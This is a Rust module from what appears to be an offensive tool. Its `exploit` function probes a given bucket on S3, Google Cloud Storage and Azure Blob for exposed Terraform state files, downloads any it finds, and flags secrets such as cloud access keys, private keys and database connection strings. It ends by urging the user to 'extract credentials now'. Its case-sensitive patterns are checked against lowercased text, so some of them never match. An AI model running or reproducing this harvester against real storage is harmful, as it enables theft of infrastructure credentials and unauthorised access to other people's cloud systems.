use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const TFSTATE_PATHS: &[&str] = &[
    "terraform.tfstate",
    "terraform.tfstate.backup",
    "terraform.tfstate.d/",
    "env:/prod/terraform.tfstate",
    "env:/staging/terraform.tfstate",
    "env:/dev/terraform.tfstate",
    "default.tfstate",
    "global.tfstate",
    "main.tfstate",
    "infra.tfstate",
    "network.tfstate",
    "database.tfstate",
    "k8s.tfstate",
    "prod.tfstate",
    "staging.tfstate",
    ".terraform/terraform.tfstate",
];

const S3_REGIONS: &[&str] = &[
    "s3.amazonaws.com",
    "s3.us-east-1.amazonaws.com",
    "s3.us-east-2.amazonaws.com",
    "s3.us-west-1.amazonaws.com",
    "s3.us-west-2.amazonaws.com",
    "s3.eu-west-1.amazonaws.com",
    "s3.eu-west-2.amazonaws.com",
    "s3.eu-central-1.amazonaws.com",
    "s3.ap-southeast-1.amazonaws.com",
    "s3.ap-southeast-2.amazonaws.com",
    "s3.ap-northeast-1.amazonaws.com",
];

const SENSITIVE_PATTERNS: &[&str] = &[
    "password",
    "secret_key",
    "access_key",
    "private_key",
    "api_key",
    "token",
    "connection_string",
    "AKIA",
    "sk-",
    "BEGIN RSA PRIVATE KEY",
    "BEGIN PRIVATE KEY",
    "mongodb://",
    "postgres://",
    "mysql://",
    "redis://",
    "amqp://",
    "wJalrXUt",
    "client_secret",
    "azure_storage",
    "google_credentials",
];

pub async fn exploit(bucket: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Terraform State File Exploitation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Bucket: {}", "[*]".cyan().bold(), bucket);
    println!(
        "{} Testing {} paths across {} regions",
        "[*]".cyan().bold(),
        TFSTATE_PATHS.len(),
        S3_REGIONS.len()
    );
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let mut found_states = Vec::new();

    for region in S3_REGIONS {
        for path in TFSTATE_PATHS {
            let url = format!("https://{}.{}/{}", bucket, region, path);
            match client.get(&url).send().await {
                Ok(resp) => {
                    let status = resp.status().as_u16();
                    if status == 200 {
                        let body = resp.text().await.unwrap_or_default();
                        if body.contains("terraform")
                            || body.contains("resources")
                            || body.contains("\"version\"")
                        {
                            println!(
                                "  {} {:60} {}",
                                "*".green().bold(),
                                path,
                                "TFSTATE FOUND".red().bold()
                            );
                            found_states.push((path.to_string(), region.to_string(), body.clone()));

                            let mut secrets_found = Vec::new();
                            for pattern in SENSITIVE_PATTERNS {
                                if body.to_lowercase().contains(pattern) {
                                    secrets_found.push(*pattern);
                                }
                            }
                            if !secrets_found.is_empty() {
                                println!("    {} Sensitive patterns found:", "[!]".red().bold());
                                for s in &secrets_found {
                                    println!("      {} {}", "-".red(), s);
                                }
                            }
                            let resource_count = body.matches("\"resource\"").count();
                            println!("    {} Resources: {}", "*".cyan(), resource_count);
                            println!("    {} Size: {} bytes", "*".cyan(), body.len());
                        }
                    } else if status == 403 {
                        // Bucket exists but access denied for this path
                    }
                }
                Err(_) => {}
            }
        }
        if !found_states.is_empty() {
            break;
        }
    }

    if found_states.is_empty() {
        println!(
            "  {} No tfstate files found in bucket.",
            "[-]".yellow().bold()
        );
        println!("  {} Trying GCS and Azure Blob...", "[*]".cyan().bold());

        let gcs_url = format!(
            "https://storage.googleapis.com/{}/terraform.tfstate",
            bucket
        );
        match client.get(&gcs_url).send().await {
            Ok(resp) if resp.status().as_u16() == 200 => {
                let body = resp.text().await.unwrap_or_default();
                if body.contains("terraform") {
                    println!("  {} GCS: tfstate found!", "[!]".red().bold());
                    found_states.push(("terraform.tfstate".to_string(), "GCS".to_string(), body));
                }
            }
            _ => {}
        }

        let azure_url = format!(
            "https://{}.blob.core.windows.net/terraform/terraform.tfstate",
            bucket
        );
        match client.get(&azure_url).send().await {
            Ok(resp) if resp.status().as_u16() == 200 => {
                let body = resp.text().await.unwrap_or_default();
                if body.contains("terraform") {
                    println!("  {} Azure Blob: tfstate found!", "[!]".red().bold());
                    found_states.push(("terraform.tfstate".to_string(), "Azure".to_string(), body));
                }
            }
            _ => {}
        }
    }

    println!(
        "\n{} Summary: {} tfstate file(s) found",
        "[*]".cyan().bold(),
        found_states.len()
    );
    for (path, region, body) in &found_states {
        let secrets: Vec<&str> = SENSITIVE_PATTERNS
            .iter()
            .filter(|p| body.to_lowercase().contains(**p))
            .copied()
            .collect();
        println!(
            "  {} {}/{} — {} sensitive patterns, {} bytes",
            "*".cyan(),
            region,
            path,
            secrets.len(),
            body.len()
        );
        if !secrets.is_empty() {
            println!("    {} Secrets: {}", "[!]".red().bold(), secrets.join(", "));
        }
    }

    if !found_states.is_empty() {
        println!(
            "\n{} Terraform state contains infrastructure secrets — extract credentials now!",
            "[!]".red().bold()
        );
    }
    Ok(())
}
